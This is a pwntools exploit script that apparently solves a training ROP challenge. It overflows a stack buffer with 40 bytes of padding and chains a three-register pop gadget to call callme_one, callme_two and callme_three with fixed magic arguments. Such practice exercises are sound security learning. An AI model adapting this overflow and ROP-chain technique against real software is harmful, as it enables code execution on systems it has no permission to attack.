from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

#x = cyclic(500)
#p.sendline(x)

padding = b'A' * 40
chain = padding

callme_one = p64(e.sym['callme_one'])
callme_two = p64(e.sym['callme_two'])
callme_three = p64(e.sym['callme_three'])

arg_1 = p64(0xdeadbeefdeadbeef)
arg_2 = p64(0xcafebabecafebabe)
arg_3 = p64(0xd00df00dd00df00d)

chain += p64(0x40093c) # pop rdi; pop rsi; pop rdx; ret;
chain += arg_1
chain += arg_2
chain += arg_3
chain += callme_one

chain += p64(0x40093c) # pop rdi; pop rsi; pop rdx; ret;
chain += arg_1
chain += arg_2
chain += arg_3
chain += callme_two

chain += p64(0x40093c) # pop rdi; pop rsi; pop rdx; ret;
chain += arg_1
chain += arg_2
chain += arg_3
chain += callme_three

p.recvuntil(">")
p.sendline(chain)

response = p.recvall().decode()
print(response)

p.interactive()

